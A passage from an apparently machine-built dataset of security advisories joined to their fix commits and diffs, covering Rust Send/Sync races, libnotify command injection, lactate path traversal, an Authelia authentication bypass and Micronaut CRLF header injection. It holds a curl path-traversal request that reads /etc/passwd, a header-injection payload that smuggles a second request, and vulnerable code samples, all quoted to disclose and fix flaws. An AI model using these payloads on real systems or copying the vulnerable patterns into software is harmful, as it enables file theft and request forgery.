`PinSlab<T>` & `Unordered<T, S>`.","published_date":"2021-08-25","chain_len":2,"project":"https:\/\/github.com\/udoprog\/unicycle","commit_href":"https:\/\/github.com\/udoprog\/unicycle\/commit\/6a6c367a0c25f86f998fa315ea90c328f685b194","commit_sha":"6a6c367a0c25f86f998fa315ea90c328f685b194","patch":"MULTI","chain_ord":"['92f40b4a2c671553dfa96feacff0265206c44ce5', '6a6c367a0c25f86f998fa315ea90c328f685b194']","before_first_fix_commit":"{'c6a1e1601e8ddfb33d2846abca3c3ddc50e0493c'}","last_fix_commit":"6a6c367a0c25f86f998fa315ea90c328f685b194","chain_ord_pos":2.0,"commit_datetime":"01\/24\/2021, 03:29:54","message":"Fix trait bounds in Send\/Sync impl: Unordered<T,S>\nThis commit is a follow-up fix for the issue raised in\nhttps:\/\/github.com\/udoprog\/unicycle\/issues\/8#issuecomment-763780334 .","author":"JOE1994","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'src\/lib.rs': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/udoprog\/unicycle\/raw\/6a6c367a0c25f86f998fa315ea90c328f685b194\/src%2Flib.rs', 'patch': '@@ -377,8 +377,8 @@ where\\n     _marker: marker::PhantomData<S>,\\n }\\n \\n-unsafe impl<T, S> Send for Unordered<T, S> where S: Send + Sentinel {}\\n-unsafe impl<T, S> Sync for Unordered<T, S> where S: Sync + Sentinel {}\\n+unsafe impl<T: Send, S> Send for Unordered<T, S> where S: Sentinel {}\\n+unsafe impl<T: Sync, S> Sync for Unordered<T, S> where S: Sentinel {}\\n \\n impl<T, S> Unpin for Unordered<T, S> where S: Sentinel {}'}}","message_norm":"fix trait bounds in send\/sync impl: unordered<t,s>\nthis commit is a follow-up fix for the issue raised in\nhttps:\/\/github.com\/udoprog\/unicycle\/issues\/8#issuecomment-763780334 .","language":"en","entities":"[('fix', 'ACTION', ''), ('issue', 'FLAW', ''), ('https:\/\/github.com\/udoprog\/unicycle\/issues\/8#issuecomment-763780334', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/lib.rs'])","num_files":1.0},{"index":782,"vuln_id":"GHSA-686h-j8r8-wmfm","cwe_id":"{'CWE-362', 'CWE-77'}","score":8.1,"chain":"{'https:\/\/github.com\/Xudong-Huang\/rcu_cell\/pull\/4\/commits\/1faf18eee11f14969b77ae0f76dcd9ebd437d0c2'}","dataset":"osv","summary":"Data races in rcu_cell Affected versions of this crate unconditionally implement Send\/Sync for `RcuCell<T>`.\nThis allows users to send `T: !Send` to other threads (while `T` enclosed within `RcuCell<T>`), and allows users to concurrently access `T: !Sync` by using the APIs of `RcuCell<T>` that provide access to `&T`.\n\nThis can result in memory corruption caused by data races.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/Xudong-Huang\/rcu_cell","commit_href":"https:\/\/github.com\/Xudong-Huang\/rcu_cell\/pull\/4\/commits\/1faf18eee11f14969b77ae0f76dcd9ebd437d0c2","commit_sha":"1faf18eee11f14969b77ae0f76dcd9ebd437d0c2","patch":"SINGLE","chain_ord":"['1faf18eee11f14969b77ae0f76dcd9ebd437d0c2']","before_first_fix_commit":"{'0e4dc8cd07002a583462994ab4bcfecdf3338fae'}","last_fix_commit":"1faf18eee11f14969b77ae0f76dcd9ebd437d0c2","chain_ord_pos":1.0,"commit_datetime":"01\/20\/2021, 03:33:02","message":"Fix Send\/Sync impl of RcuCell<T>","author":"JOE1994","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'src\/lib.rs': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Xudong-Huang\/rcu_cell\/raw\/1faf18eee11f14969b77ae0f76dcd9ebd437d0c2\/src%2Flib.rs', 'patch': '@@ -372,8 +372,8 @@ pub struct RcuCell<T> {\\n     link: LinkWrapper<T>,\\n }\\n \\n-unsafe impl<T> Send for RcuCell<T> {}\\n-unsafe impl<T> Sync for RcuCell<T> {}\\n+unsafe impl<T: Send> Send for RcuCell<T> {}\\n+unsafe impl<T: Sync> Sync for RcuCell<T> {}\\n \\n impl<T> Default for RcuCell<T> {\\n     fn default() -> Self {'}}","message_norm":"fix send\/sync impl of rcucell<t>","language":"en","entities":"[('fix', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/lib.rs'])","num_files":1.0},{"index":784,"vuln_id":"GHSA-6898-wx94-8jq8","cwe_id":"{'CWE-74'}","score":9.8,"chain":"{'https:\/\/github.com\/mytrile\/node-libnotify\/commit\/dfe7801d73a0dda10663a0ff3d0ec8b4d5f0d448'}","dataset":"osv","summary":"Potential Command Injection in libnotify Versions 1.0.3 and earlier of libnotify are affected by a shell command injection vulnerability. This may result in execution of arbitrary shell commands, if user input is passed into libnotify.notify.\n\nUntrusted input passed in the call to libnotify.notify could result in execution of shell commands. Callers may be unaware of this.\n\n### Example\n```\nvar libnotify = require('libnotify')\nlibnotify.notify('UNTRUSTED INPUT', { title: \\\"\\\" }, function () {\n    console.log(arguments);\n})\n```\n\nSpecial thanks to Neal Poole for submitting the pull request to fix this issue.\n\n\n## Recommendation\n\nUpdate to version 1.0.4 or greater","published_date":"2020-08-31","chain_len":1,"project":"https:\/\/github.com\/mytrile\/node-libnotify","commit_href":"https:\/\/github.com\/mytrile\/node-libnotify\/commit\/dfe7801d73a0dda10663a0ff3d0ec8b4d5f0d448","commit_sha":"dfe7801d73a0dda10663a0ff3d0ec8b4d5f0d448","patch":"SINGLE","chain_ord":"['dfe7801d73a0dda10663a0ff3d0ec8b4d5f0d448']","before_first_fix_commit":"{'8e2e7306088624503ba5eec592b502c4f97d8846', '688e135134c4e45abf18d42ddb85a7ab8c9a7ab8'}","last_fix_commit":"dfe7801d73a0dda10663a0ff3d0ec8b4d5f0d448","chain_ord_pos":1.0,"commit_datetime":"05\/14\/2013, 19:46:34","message":"Merge pull request #4 from nealpoole\/exec-fix\n\nReplacing call to exec with execFile.","author":"Dimitar Kostov","comments":null,"stats":"{'additions': 4, 'deletions': 5, 'total': 9}","files":"{'lib\/libnotify.js': {'additions': 4, 'deletions': 5, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mytrile\/node-libnotify\/raw\/dfe7801d73a0dda10663a0ff3d0ec8b4d5f0d448\/lib%2Flibnotify.js', 'patch': '@@ -55,18 +55,17 @@ exports.binVersion = function(callback) {\\n \\n exports.notify = function(msg, options, callback) {\\n   var image,\\n-      args = [\\'notify-send\\',\\'\"\\' + msg + \\'\"\\'],\\n+      args = [msg],\\n       options = options || {}\\n   this.binVersion(function(err, version){\\n     if (err) return callback(err)\\n-    if (image = options.image) args.push(\\'-i \\' + image)\\n+    if (image = options.image) args.push(\\'-i\\', image)\\n     if (options.time) args.push(\\'-t\\', options.time)\\n     if (options.category) args.push(\\'-c\\', options.category)\\n     if (options.urgency) args.push(\\'-u\\', options.urgency)\\n     if (options.title) {\\n-      args.shift()\\n-      args.unshift(\\'notify-send\\', \\'\"\\'+ options.title +\\'\"\\')\\n+      args.unshift(options.title)\\n     }\\n-    child_process.exec(args.join(\\' \\'), callback)\\n+    child_process.execFile(\\'notify-send\\', args, {}, callback)\\n   })\\n }'}}","message_norm":"merge pull request #4 from nealpoole\/exec-fix\n\nreplacing call to exec with execfile.","language":"en","entities":"[('#4', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/libnotify.js'])","num_files":1.0},{"index":786,"vuln_id":"GHSA-68gr-cmcp-g3mj","cwe_id":"{'CWE-22'}","score":7.5,"chain":"{'https:\/\/github.com\/RetireJS\/retire.js\/commit\/800c8140884eaa5753a49308f560c925fe97b9a5'}","dataset":"osv","summary":"Directory Traversal in lactate A crafted `GET` request can be leveraged to traverse the directory structure of a host using the lactate web server package, and request arbitrary files outside of the specified web root. This allows for a remote attacker to gain access to arbitrary files on the filesystem that the process has access to read.\n\nMitigating factors:\nOnly files that the user running `lactate` has permission to read will be accessible via this vulnerability.\n\n\n[Proof of concept](https:\/\/hackerone.com\/reports\/296645):\nPlease globally install the `lactate` package and `cd` to a directory you wish to serve assets from. Next, run `lactate -p 8081` to start serving files from this location.\n\nThe following cURL request can be used to demonstrate this vulnerability by requesting the target `\/etc\/passwd` file:\n\n```\ncurl \"http:\/\/127.0.0.1:8081\/%2e%2e\/%2e%2e\/%2e%2e\/%2e%2e\/%2e%2e\/etc\/passwd\"\n```\n```\nroot:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\n[...]\n```\n\n\n## Recommendation\n\nAs there is currently no fix for this issue selecting an alternative static web server would be the best choice.","published_date":"2019-06-14","chain_len":1,"project":"https:\/\/github.com\/RetireJS\/retire.js","commit_href":"https:\/\/github.com\/RetireJS\/retire.js\/commit\/800c8140884eaa5753a49308f560c925fe97b9a5","commit_sha":"800c8140884eaa5753a49308f560c925fe97b9a5","patch":"SINGLE","chain_ord":"['800c8140884eaa5753a49308f560c925fe97b9a5']","before_first_fix_commit":"{'ed3512729af76583b28611a4a1b6a8797d7f074c'}","last_fix_commit":"800c8140884eaa5753a49308f560c925fe97b9a5","chain_ord_pos":1.0,"commit_datetime":"02\/05\/2018, 06:47:18","message":"HackerOne Node.js Ecosystem Bug Bounty Program - January 2018 disclosures (#199)","author":"Rafal Janicki","comments":null,"stats":"{'additions': 104, 'deletions': 8, 'total': 112}","files":"{'repository\/npmrepository.json': {'additions': 104, 'deletions': 8, 'changes': 112, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/RetireJS\/retire.js\/raw\/800c8140884eaa5753a49308f560c925fe97b9a5\/repository%2Fnpmrepository.json', 'patch': '@@ -4461,16 +4461,112 @@\\n         ]\\n       }\\n     ]\\n+  },\\n+  \"fastify\": {\\n+    \"vulnerabilities\": [\\n+      {\\n+        \"below\": \"0.38.0\",\\n+        \"severity\": \"critical\",\\n+        \"identifiers\": {\\n+          \"CVE\": [\\n+            \"CVE-2018-3711\"\\n+          ],\\n+          \"summary\": \"denial-of-service vulnerability with large JSON payloads\"\\n+        },\\n+        \"info\": [\\n+          \"https:\/\/hackerone.com\/reports\/303632\"\\n+        ]\\n+      }\\n+    ]\\n+  },\\n+  \"serve\": {\\n+    \"vulnerabilities\": [\\n+      {\\n+        \"below\": \"6.4.9\",\\n+        \"severity\": \"critical\",\\n+        \"identifiers\": {\\n+          \"CVE\": [\\n+            \"CVE-2018-3712\"\\n+          ],\\n+          \"summary\": \"Path Traversal\"\\n+        },\\n+        \"info\": [\\n+          \"https:\/\/hackerone.com\/reports\/307666\"\\n+        ]\\n+      }\\n+    ]\\n+  },\\n+  \"augustine\": {\\n+    \"vulnerabilities\": [\\n+      {\\n+        \"below\": \"0.2.4\",\\n+        \"severity\": \"critical\",\\n+        \"identifiers\": {\\n+          \"summary\": \"Path Traversal\"\\n+        },\\n+        \"info\": [\\n+          \"https:\/\/hackerone.com\/reports\/296282\"\\n+        ]\\n+      }\\n+    ]\\n+  },\\n+  \"lactate\": {\\n+    \"vulnerabilities\": [\\n+      {\\n+        \"below\": \"0.13.13\",\\n+        \"severity\": \"medium\",\\n+        \"identifiers\": {\\n+          \"summary\": \"Path Traversal\"\\n+        },\\n+        \"info\": [\\n+          \"https:\/\/hackerone.com\/reports\/296645\"\\n+        ]\\n+      }\\n+    ]\\n+  },\\n+  \"redis-commander\": {\\n+    \"vulnerabilities\": [\\n+      {\\n+        \"below\": \"0.4.6\",\\n+        \"severity\": \"low\",\\n+        \"identifiers\": {\\n+          \"summary\": \"Reflected XSS\"\\n+        },\\n+        \"info\": [\\n+          \"https:\/\/hackerone.com\/reports\/296377\"\\n+        ]\\n+      }\\n+    ]\\n+  },\\n+  \"featurebook\": {\\n+    \"vulnerabilities\": [\\n+      {\\n+        \"below\": \"0.0.33\",\\n+        \"severity\": \"medium\",\\n+        \"identifiers\": {\\n+          \"summary\": \"Path Traversal\"\\n+        },\\n+        \"info\": [\\n+          \"https:\/\/hackerone.com\/reports\/296305\"\\n+        ]\\n+      }\\n+    ]\\n+  },\\n+  \"serve-here\": {\\n+    \"vulnerabilities\": [\\n+      {\\n+        \"below\": \"3.2.2\",\\n+        \"severity\": \"medium\",\\n+        \"identifiers\": {\\n+          \"summary\": \"Path Traversal\"\\n+        },\\n+        \"info\": [\\n+          \"https:\/\/hackerone.com\/reports\/296254\"\\n+        ]\\n+      }\\n+    ]\\n   }\\n \\n \\n \\n-\\n-\\n-\\n-\\n-\\n-\\n-\\n-\\n }'}}","message_norm":"hackerone node.js ecosystem bug bounty program - january 2018 disclosures (#199)","language":"en","entities":"[('bug', 'FLAW', ''), ('#199', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['repository\/npmrepository.json'])","num_files":1.0},{"index":791,"vuln_id":"GHSA-68wm-pfjf-wqp6","cwe_id":"{'CWE-287'}","score":10.0,"chain":"{'https:\/\/github.com\/authelia\/authelia\/commit\/c62dbd43d6e69ae81530e7c4f8763857f8ff1dda'}","dataset":"osv","summary":"Authentication bypassed with malformed request URI on nginx ### Impact\nThis affects uses who are using nginx ngx_http_auth_request_module with Authelia, it allows a malicious individual who crafts a malformed HTTP request to bypass the authentication mechanism. It additionally could theoretically affect other proxy servers, but all of the ones we officially support except nginx do not allow malformed URI paths.\n\n### Patches\nThe problem is rectified entirely in v4.29.3. As this patch is relatively straightforward we can back port this to any version upon request. Alternatively we are supplying a git patch to 4.25.1 which should be relatively straightforward to apply to any version, the git patches for specific versions can be found below.\n\n<details><summary>Patch for 4.25.1:<\/summary><p>\n\n```patch\nFrom ca22f3d2c44ca7bef043ffbeeb06d6659c1d550f Mon Sep 17 00:00:00 2001\nFrom: James Elliott <james-d-elliott@users.noreply.github.com>\nDate: Wed, 19 May 2021 12:10:13 +1000\nSubject: [PATCH] fix(handlers): verify returns 200 on malformed request\n\nThis is a git patch for commit at tag v4.25.1 to address a potential method to bypass authentication in proxies that forward malformed information to Authelia in the forward auth process. Instead of returning a 200 this ensures that Authelia returns a 401 when this occurs.\n---\n internal\/handlers\/handler_verify.go | 4 +++-\n 1 file changed, 3 insertions(+), 1 deletion(-)\n\ndiff --git a\/internal\/handlers\/handler_verify.go b\/internal\/handlers\/handler_verify.go\nindex 65c064ce..4dd9702d 100644\n--- a\/internal\/handlers\/handler_verify.go\n+++ b\/internal\/handlers\/handler_verify.go\n@@ -396,7 +396,9 @@ func VerifyGet(cfg schema.AuthenticationBackendConfiguration) middlewares.Reques\n \t\ttargetURL, err := getOriginalURL(ctx)\n \n \t\tif err != nil {\n-\t\t\tctx.Error(fmt.Errorf(\"Unable to parse target URL: %s\", err), operationFailedMessage)\n+\t\t\tctx.Logger.Error(fmt.Errorf(\"Unable to parse target URL: %s\", err))\n+\t\t\tctx.ReplyUnauthorized()\n+\n \t\t\treturn\n \t\t}\n \n-- \n2.31.1\n```\n\n<\/p><\/details>\n\n### Workarounds\nThe most relevant workaround is upgrading. **If you need assistance with an upgrade please contact us on [Matrix](https:\/\/riot.im\/app\/#\/room\/#authelia:matrix.org) or [Discord](https:\/\/discord.authelia.com).** Please just let us know you're needing help upgrading to above 4.29.2. \n\nYou can add an block which fails requests that contains a malformed URI in the internal location block. We have crafted one that should work in most instances, it basically checks no chars that are required to be URL-encoded for either the path or the query are in the URI. Basically this regex checks that the characters between the square braces are the only characters in the $request_uri header, if they exist, it returns a HTTP 401 status code. The characters in the regex match are tested to not cause a parsing error that would result in a failure, however they are not exhaustive since query strings seem to not always conform to the RFC.\n\n<details><summary>authelia.conf:<\/summary><p>\n\n```nginx\nlocation \/authelia {\n    internal;\n    # **IMPORTANT**\n    # This block rejects requests with a 401 which contain characters that are unable to be parsed.\n    # It is necessary for security prior to v4.29.3 due to the fact we returned an invalid code in the event of a parser error.\n    # You may comment this section if you're using Authelia v4.29.3 or above. We strongly recommend upgrading.\n    # RFC3986: http:\/\/tools.ietf.org\/html\/rfc3986\n    # Commentary on RFC regarding Query Strings: https:\/\/www.456bereastreet.com\/archive\/201008\/what_characters_are_allowed_unencoded_in_query_strings\/\n    if ($request_uri ~ [^a-zA-Z0-9_+-=\\!@$%&*?~.:#'\\;\\(\\)\\[\\]]) {\n        return 401;\n    }\n\n    # Include the remainder of the block here. \n}\n````\n\n<\/p><\/details>\n\n### Discovery\n\nThis issue was discovered by:\n\nSiemens Energy\nCybersecurity Red Team\n\n- Silas Francisco\n- Ricardo Pesqueira\n\n\n### Identifying active exploitation of the vulnerability\n\nThe following regex should match log entries that are an indication of the vulnerability being exploited:\n```regex\nlevel=error msg=\"Unable to parse target URL: Unable to parse URL (extracted from X-Original-URL header)?.*?: parse.*?net\/url:.*github\\.com\/authelia\/authelia\/internal\/handlers\/handler_verify\\.go\n```\n\nExample log entry ***with*** X-Original-URL configured:\n```log\ntime=\"2021-05-21T16:31:15+10:00\" level=error msg=\"Unable to parse target URL: Unable to parse URL extracted from X-Original-URL header: parse \\\"https:\/\/example.com\/\": net\/url: invalid control character in URL\" method=GET path=\/api\/verify remote_ip=192.168.1.10 stack=\"github.com\/authelia\/authelia\/internal\/middlewares\/authelia_context.go:65 (*AutheliaCtx).Error\\ngithub.com\/authelia\/authelia\/internal\/handlers\/handler_verify.go:431     VerifyGet.func1\\ngithub.com\/authelia\/authelia\/internal\/middlewares\/authelia_context.go:50 AutheliaMiddleware.func1.1\\ngithub.com\/fasthttp\/router@v1.3.12\/router.go:414                         (*Router).Handler\\ngithub.com\/authelia\/authelia\/internal\/middlewares\/log_request.go:14      LogRequestMiddleware.func1\\ngithub.com\/valyala\/fasthttp@v1.24.0\/server.go:2219                       (*Server).serveConn\\ngithub.com\/valyala\/fasthttp@v1.24.0\/workerpool.go:223                    (*workerPool).workerFunc\\ngithub.com\/valyala\/fasthttp@v1.24.0\/workerpool.go:195                    (*workerPool).getCh.func1\\nruntime\/asm_amd64.s:1371                                                 goexit\"\n```\n\nExample log entry ***without*** X-Original-URL configured:\n```log\ntime=\"2021-05-21T16:30:17+10:00\" level=error msg=\"Unable to parse target URL: Unable to parse URL https:\/\/example.com\/: parse \\\"https:\/\/example.com\/\": net\/url: invalid control character in URL\" method=GET path=\/api\/verify remote_ip=192.168.1.10 stack=\"github.com\/authelia\/authelia\/internal\/middlewares\/authelia_context.go:65 (*AutheliaCtx).Error\\ngithub.com\/authelia\/authelia\/internal\/handlers\/handler_verify.go:431     VerifyGet.func1\\ngithub.com\/authelia\/authelia\/internal\/middlewares\/authelia_context.go:50 AutheliaMiddleware.func1.1\\ngithub.com\/fasthttp\/router@v1.3.12\/router.go:414                         (*Router).Handler\\ngithub.com\/authelia\/authelia\/internal\/middlewares\/log_request.go:14      LogRequestMiddleware.func1\\ngithub.com\/valyala\/fasthttp@v1.24.0\/server.go:2219                       (*Server).serveConn\\ngithub.com\/valyala\/fasthttp@v1.24.0\/workerpool.go:223                    (*workerPool).workerFunc\\ngithub.com\/valyala\/fasthttp@v1.24.0\/workerpool.go:195                    (*workerPool).getCh.func1\\nruntime\/asm_amd64.s:1371                                                 goexit\"\n```\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue at [authelia](https:\/\/github.com\/authelia\/authelia\/issues)\n* Email us at [security@authelia.com](mailto:security@authelia.com)","published_date":"2021-12-20","chain_len":1,"project":"https:\/\/github.com\/authelia\/authelia","commit_href":"https:\/\/github.com\/authelia\/authelia\/commit\/c62dbd43d6e69ae81530e7c4f8763857f8ff1dda","commit_sha":"c62dbd43d6e69ae81530e7c4f8763857f8ff1dda","patch":"SINGLE","chain_ord":"['c62dbd43d6e69ae81530e7c4f8763857f8ff1dda']","before_first_fix_commit":"{'a56cffa129a0fedb830971855ab695a95cf96312'}","last_fix_commit":"c62dbd43d6e69ae81530e7c4f8763857f8ff1dda","chain_ord_pos":1.0,"commit_datetime":"05\/21\/2021, 12:03:44","message":"fix(handlers): align response status codes for the verify endpoint (#2016)\n\nThis aligns all response status codes on the \/api\/verify endpoint when an error occurs, making it impossible to determine the actual reason for the failure.","author":"James Elliott","comments":null,"stats":"{'additions': 3, 'deletions': 1, 'total': 4}","files":"{'internal\/handlers\/handler_verify.go': {'additions': 3, 'deletions': 1, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/authelia\/authelia\/raw\/c62dbd43d6e69ae81530e7c4f8763857f8ff1dda\/internal%2Fhandlers%2Fhandler_verify.go', 'patch': '@@ -428,7 +428,9 @@ func VerifyGet(cfg schema.AuthenticationBackendConfiguration) middlewares.Reques\\n \\t\\ttargetURL, err := ctx.GetOriginalURL()\\n \\n \\t\\tif err != nil {\\n-\\t\\t\\tctx.Error(fmt.Errorf(\"Unable to parse target URL: %s\", err), operationFailedMessage)\\n+\\t\\t\\tctx.Logger.Error(fmt.Errorf(\"Unable to parse target URL: %s\", err))\\n+\\t\\t\\tctx.ReplyUnauthorized()\\n+\\n \\t\\t\\treturn\\n \\t\\t}'}}","message_norm":"fix(handlers): align response status codes for the verify endpoint (#2016)\n\nthis aligns all response status codes on the \/api\/verify endpoint when an error occurs, making it impossible to determine the actual reason for the failure.","language":"en","entities":"[('fix(handlers', 'ACTION', ''), ('#2016', 'ISSUE', ''), ('verify', 'ACTION', ''), ('error', 'FLAW', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['internal\/handlers\/handler_verify.go'])","num_files":1.0},{"index":792,"vuln_id":"GHSA-694p-xrhg-x3wm","cwe_id":"{'CWE-444'}","score":9.8,"chain":"{'https:\/\/github.com\/micronaut-projects\/micronaut-core\/commit\/9d1eff5c8df1d6cda1fe00ef046729b2a6abe7f1', 'https:\/\/github.com\/micronaut-projects\/micronaut-core\/commit\/6deb60b75517f80c57b42d935f07955c773b766d', 'https:\/\/github.com\/micronaut-projects\/micronaut-core\/commit\/bc855e439c4a5ced3d83195bb59d0679cbd95add'}","dataset":"osv","summary":"CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request Header Injection') ### Vulnerability\n\nMicronaut's HTTP client is vulnerable to \"HTTP Request Header Injection\" due to not validating request headers passed to the client.\n\nExample of vulnerable code:\n\n```java\n@Controller(\"\/hello\")\npublic class HelloController {\n\n    @Inject\n    @Client(\"\/\")\n    RxHttpClient client;\n\n    @Get(\"\/external-exploit\")\n    @Produces(MediaType.TEXT_PLAIN)\n    public String externalExploit(@QueryValue(\"header-value\") String headerValue) {\n        return client.toBlocking().retrieve(\n            HttpRequest.GET(\"\/hello\")\n                .header(\"Test\", headerValue)\n        );\n    }\n}\n```\n\nIn the above case a query value received from a user is passed as a header value to the client. Since the client doesn't validate the header value the request headers and body have the potential to be manipulated.\n\nFor example, a user that supplies the following payload, can force the client to make multiple attacker-controlled HTTP requests.\n\n```java\nList<String> headerData = List.of(\n    \"Connection: Keep-Alive\", \/\/ This keeps the connection open so another request can be stuffed in.\n    \"\",\n    \"\",\n    \"POST \/hello\/super-secret HTTP\/1.1\",\n    \"Host: 127.0.0.1\",\n    \"Content-Length: 31\",\n    \"\",\n    \"{\\\"new\\\":\\\"json\\\",\\\"content\\\":\\\"here\\\"}\",\n    \"\",\n    \"\"\n);\nString headerValue = \"H\\r\\n\" + String.join(\"\\r\\n\", headerData);;\nURI theURI =\n    UriBuilder\n        .of(\"\/hello\/external-exploit\")\n        .queryParam(\"header-value\", headerValue) \/\/ Automatically URL encodes data\n        .build();\nHttpRequest<String> request = HttpRequest.GET(theURI);\nString body = client.toBlocking().retrieve(request);\n```\n\nNote that using `@HeaderValue` instead of `@QueryValue` is not vulnerable since Micronaut's HTTP server does validate the headers passed to the server, so the exploit can only be triggered by using user data that is not an HTTP header (query values, form data etc.).\n\n### Impact\n\nThe attacker is able to control the entirety of the HTTP body for their custom requests.\nAs such, this vulnerability enables attackers to perform a variant of [Server Side Request Forgery](https:\/\/cwe.mitre.org\/data\/definitions\/918.html).\n\n### Patches\n\nThe problem has been patched in the `micronaut-http-client` versions 1.2.11 and 1.3.2 and above.\n\n### Workarounds\n\nDo not pass user data directly received from HTTP request parameters as headers in the HTTP client.\n\n### References\n\nFix commits\n- https:\/\/github.com\/micronaut-projects\/micronaut-core\/commit\/9d1eff5c8df1d6cda1fe00ef046729b2a6abe7f1\n- https:\/\/github.com\/micronaut-projects\/micronaut-core\/commit\/6deb60b75517f80c57b42d935f07955c773b766d\n- https:\/\/github.com\/micronaut-projects\/micronaut-core\/commit\/bc855e439c4a5ced3d83195bb59d0679cbd95add\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [micronaut-core](https:\/\/github.com\/micronaut-projects\/micronaut-core)\n* Email us at [info@micronaut.io](mailto:info@micronaut.io)\n\n### Credit\n\nOriginally reported by @JLLeitschuh","published_date":"2020-03-30","chain_len":3,"project":"https:\/\/github.com\/micronaut-projects\/micronaut-core","commit_href":"https:\/\/github.com\/micronaut-projects\/micronaut-core\/commit\/9d1eff5c8df1d6cda1fe00ef046729b2a6abe7f1","commit_sha":"9d1eff5c8df1d6cda1fe00ef046729b2a6abe7f1","patch":"MULTI","chain_ord":"['6deb60b75517f80c57b42d935f07955c773b766d', 'bc855e439c4a5ced3d83195bb59d0679cbd95add', '9d1eff5c8df1d6cda1fe00ef046729b2a6abe7f1']","before_first_fix_commit":"{'a2392f4289f7777c4a310c3ae3bb4bc0ce5a65c2'}","last_fix_commit":"9d1eff5c8df1d6cda1fe00ef046729b2a6abe7f1","chain_ord_pos":3.0,"commit_datetime":"03\/09\/2020, 18:20:28","message":"Validate client headers","author":"jameskleeh","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'http-netty\/src\/main\/java\/io\/micronaut\/http\/netty\/NettyHttpHeaders.java': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/micronaut-projects\/micronaut-core\/raw\/9d1eff5c8df1d6cda1fe00ef046729b2a6abe7f1\/http-netty%2Fsrc%2Fmain%2Fjava%2Fio%2Fmicronaut%2Fhttp%2Fnetty%2FNettyHttpHeaders.java', 'patch': '@@ -53,7 +53,7 @@ public NettyHttpHeaders(io.netty.handler.codec.http.HttpHeaders nettyHeaders, Co\\n      * Default constructor.\\n      *\/\\n     public NettyHttpHeaders() {\\n-        this.nettyHeaders = new DefaultHttpHeaders(false);\\n+        this.nettyHeaders = new DefaultHttpHeaders();\\n         this.conversionService = ConversionService.SHARED;\\n     }'}}","message_norm":"validate client headers","language":"nl","entities":"[('validate', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['http-netty\/src\/main\/java\/io\/micronaut\/http\/netty\/NettyHttpHeaders.java'])","num_files":1.0},{"index":794,"vuln_id":"GHSA-694p-xrhg-x3wm","cwe_id":"{'CWE-444'}","score":9.8,"chain":"{'https:\/\/github.com\/micronaut-projects\/micronaut-core\/commit\/9d1eff5c8df1d6cda1fe00ef046729b2a6abe7f1', 'https:\/\/github.com\/micronaut-projects\/micronaut-core\/commit\/6deb60b75517f80c57b42d935f07955c773b766d', 'https:\/\/github.com\/micronaut-projects\/micronaut-core\/commit\/bc855e439c4a5ced3d83195bb59d0679cbd95add'}","dataset":"osv","summary":"CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request Header Injection') ### Vulnerability\n\nMicronaut's HTTP client is vulnerable to \"HTTP Request Header Injection\" due to not validating request headers passed to the client.\n\nExample of vulnerable code:\n\n```java\n@Controller(\"\/hello\")\npublic class HelloController {\n\n    @Inject\n    @Client(\"\/\")\n    RxHttpClient client;\n\n    @Get(\"\/external-exploit\")\n    @Produces(MediaType.TEXT_PLAIN)\n    public String externalExploit(@QueryValue(\"header-value\") String headerValue) {\n        return client.toBlocking().retrieve(\n            HttpRequest.GET(\"\/hello\")\n                .header(\"Test\", headerValue)\n        );\n    }\n}\n```\n\nIn the above case a query value received from a user is passed as a header value to the client. Since the client doesn't validate the header value the request headers and body have the potential to be manipulated.\n\nFor example, a user that supplies the following payload, can force the client to make multiple attacker-controlled HTTP requests.\n\n```java\nList<String> headerData = List.of(\n    \"Connection: Keep-Alive\", \/\/ This keeps the connection open so another request can be stuffed in.\n    \"\",\n    \"\",\n    \"POST \/hello\/super-secret HTTP\/1.1\",\n    \"Host: 127.0.0.1\",\n    \"Content-Length: 31\",\n    \"\",\n    \"{\\\"new\\\":\\\"json\\\",\\\"content\\\":\\\"here\\\"}\",\n    \"\",\n    \"\"\n);\nString headerValue = \"H\\r\\n\" + String.join(\"\\r\\n\", headerData);;\nURI theURI =\n    UriBuilder\n        .of(\"\/hello\/external-exploit\")\n        .queryParam(\"header-value\", headerValue) \/\/ Automatically URL encodes data\n        .build();\nHttpRequest<String> request = HttpRequest.GET(theURI);\nString body = client.toBlocking().retrieve(request);\n```\n\nNote that using `@HeaderValue` instead of `@QueryValue` is not vulnerable since Micronaut's HTTP server does validate the headers passed to the server, so the exploit can only be triggered by using user data that is not an HTTP header (query values, form data etc.).\n\n### Impact\n\nThe attacker is able to control the entirety of the HTTP body for their custom requests.\nAs such, this vulnerability enables attackers to perform a variant of [Server Side Request Forgery](https:\/\/cwe.mitre.org\/data\/definitions\/918.html).\n\n### Patches\n\nThe problem has been patched in the `micronaut-http-client` versions 1.2.11 and 1.3.2 and above.\n\n### Workarounds\n\nDo not pass user data directly received from HTTP request parameters as headers in the HTTP client.\n\n### References\n\nFix commits\n- 